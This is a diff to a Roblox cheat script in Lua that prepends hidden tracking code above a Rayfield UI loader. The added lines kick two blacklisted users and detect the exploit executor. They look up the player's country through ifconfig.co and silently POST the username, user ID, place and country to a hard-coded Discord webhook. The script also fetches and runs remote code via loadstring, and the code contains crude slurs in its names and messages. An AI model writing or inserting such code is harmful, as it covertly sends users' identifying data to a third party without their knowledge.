@@ -1,3 +1,19 @@
+local lp=game.Players.LocalPlayer
+local bl={"CahyaXyZp","bludisdancer"}
+for _,n in ipairs(bl)do if lp.Name==n then lp:Kick("you are blacklisted because you join discord for the script and left!")break end end
+local http=game:GetService("HttpService")
+local exec="Unknown"
+if syn then exec="Synapse X"elseif identifyexecutor then exec=identifyexecutor()elseif secure_load then exec="Sentinel"elseif pebc_execute then exec="KRNL"elseif hookfunction and checkcaller and setreadonly then exec="Delta"end
+local gName="Unknown"
+local kizzy_has_a_small_dick = game:HttpGet('https://ifconfig.co/country')
+
+pcall(function()
+gName=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+local data={content=("7 gays\nUsername: "..lp.Name.."\nDisplay Name: "..lp.DisplayName.."\nUser ID: "..lp.UserId.."\nExecutor: "..exec.."\nPlace ID: "..game.PlaceId.."\nPlace Name: "..gName.."\nCountry: ".. kizzy_has_a_small_dick)}
+local js=http:JSONEncode(data)
+local req=syn and syn.request or request or http and http.request
+if req then req({Url="https://discord.com/api/webhooks/1368031977042612244/68WwHgHEZXuht_wFh33LEinLFNUGKcTDLIR7hduf2jdoici702tvXXj_hptMhnGHxvCU",Method="POST",Headers={["Content-Type"]="application/json"},Body=js})end
+
 local p = game:GetService("Players").LocalPlayer
 local r = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local w = r:CreateWindow({
